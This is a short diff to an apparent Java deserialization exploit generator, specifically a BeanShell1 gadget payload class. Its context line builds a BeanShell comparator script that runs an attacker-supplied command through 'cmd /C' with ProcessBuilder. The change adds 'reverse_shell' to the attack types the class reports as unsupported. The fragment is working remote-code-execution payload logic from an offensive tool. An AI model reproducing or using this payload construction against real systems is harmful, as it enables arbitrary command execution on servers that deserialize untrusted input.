@@ -46,7 +46,7 @@ public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQ
 	    	 
 	    	payload = "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{\"cmd\",\"/C\",\"" + command + "\"}).start();return new Integer(1);}";
 			
-	    } else if(attackType.equals("sleep") || attackType.equals("dns")) {
+	    } else if(attackType.equals("sleep") || attackType.equals("dns") || attackType.equals("reverse_shell")) {
 	    	
 	    	System.err.println("**********************************");
 	    	System.err.println(attackType + " not supported. Defaulting to exec_global");
